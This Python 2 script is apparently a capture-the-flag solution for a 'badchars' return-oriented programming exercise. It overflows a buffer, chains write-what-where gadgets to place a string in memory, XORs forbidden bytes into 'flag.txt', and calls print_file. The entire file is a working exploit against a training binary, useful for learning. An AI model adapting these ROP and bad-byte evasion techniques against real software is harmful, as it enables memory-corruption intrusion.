#!/usr/bin/env python2
import struct

def p(x):
    return struct.pack("<I", x)

# Memory locations
writeable_mem = 0x0804a018    # All zeros, so no need to null-terminate
print_file    = p(0x080483d0) # address of print_file

# Gadgets: write/what/where
pop_esi_edi_ebp = p(0x080485b9)
mov_edi_esi     = p(0x0804854f)

# Gadgets: xor
pop_ebp    = p(0x080485bb)
pop_ebx    = p(0x0804839d)
xor_ebp_bl = p(0x08048547)

def write_primitive(addr, bytes):
    # Split bytes into register-sized chunks
    size = 4 
    chunks = [bytes[n:n+size] for n in range(0, len(bytes), size)]

    buf = ""
    for chunk in chunks:
        buf += pop_esi_edi_ebp # Setup edi for "where" to write, esi for "what" to write
        buf += chunk           # The bytes to write (esi)
        buf += p(addr)         # The address to write to (edi)
        buf += "JUNK"
        buf += mov_edi_esi     # Perform the write
        addr += size
    return buf

def xor_primitive(addr, byte=None):
    buf = pop_ebp         # Setup ebp for where to xor
    buf += p(addr)        # address for ebp
    if byte is not None:
        buf += pop_ebx    # Setup ebx for what to xor with
        buf += p(byte)    # value
    buf += xor_ebp_bl     # Perform the xor
    return buf

# Overflow  
buf = 'A'*44

# Write "flbd-t{t" to memory. "ag.x" are all bad bytes
buf += write_primitive(writeable_mem, "flbd-t{t")

# xor the "badchars" to what we want
buf += xor_primitive(writeable_mem+2,0x3) # 'b'^3 => a
buf += xor_primitive(writeable_mem+3)     # 'd'^3 => g
buf += xor_primitive(writeable_mem+4)     # '-'^3 => .
buf += xor_primitive(writeable_mem+6)     # '{'^3 => x

# Call print_file
buf += print_file
buf += "JUNK"
buf += p(writeable_mem)

print(buf)
